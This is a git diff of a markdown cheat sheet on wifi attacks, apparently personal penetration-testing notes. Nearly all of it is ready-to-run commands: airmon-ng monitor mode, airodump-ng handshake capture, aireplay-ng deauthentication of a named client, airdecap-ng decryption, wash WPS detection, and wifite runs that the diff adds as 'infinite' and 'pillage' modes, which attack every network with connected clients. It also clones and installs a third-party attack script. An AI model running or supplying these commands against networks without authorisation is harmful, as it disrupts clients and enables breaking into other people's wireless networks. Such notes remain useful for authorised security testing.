@@ -1,6 +1,6 @@
 # Wifi Sniffing
 
-Airmon:
+## Airmon:
 
 	airmon-ng
 	airmon-ng start wlan0mon
@@ -11,15 +11,15 @@ Disable all network services for monitor mode:
 
 	airmon-ng check kill
 
-Airodump:
+## Airodump:
 
 	airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlan0mon
 
-Aireplay:
+## Aireplay:
 
 	aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon
 
-Airdecap-ng:
+## Airdecap-ng:
 
 	airdecap-ng -e 'the ssid' -p passphrase  tkip.cap
 
@@ -27,13 +27,13 @@ The capture file must contain a valid four-way handshake. For this purpose havin
 
 As well, only data packets following the handshake will be decrypted. This is because information is required from the handshake in order to decrypt the data packets.
 
-Wash:
+## Wash:
 
 Can be used to know if WPS is actived on router
 
-	wash -i wlan0mon
+	sudo wash -i wlan0mon
 
-Wifite:
+## Wifite:
 
 Automated tools to get all the handshakes of network we scan.
 
@@ -41,7 +41,19 @@ Can be use with other softwares to send the handshakes in a special format on a 
 
 	sudo wifite --dict '/home/kali/Downloads/custom-smprepchar-app0-100.txt' --clients-only --power 27 --bully --wps --infinite -p 30
 
-Lazy Script:
+### Infinite mode:
+
+ Loop and continue after each attack. (scan 60 sec)
+
+	sudo wifite -inf -mac -p 60 --kill --clients-only --no-wps --no-pmkid --skip-crack
+
+### Pillage mode: 
+
+Attack all wireless with connected clients after 5 minutes scan.
+
+	sudo wifite -mac -p 300 --kill --clients-only --no-wps --no-pmkid --skip-crack
+
+## Lazy Script:
 
 	cd (back to user folder)
 	git clone https://github.com/arismelachroinos/lscript.git
@@ -50,7 +62,7 @@ Lazy Script:
 	./install.sh
 	
 
-Bettercap:
+## Bettercap:
 
 Get handshakes easily for all networks
 
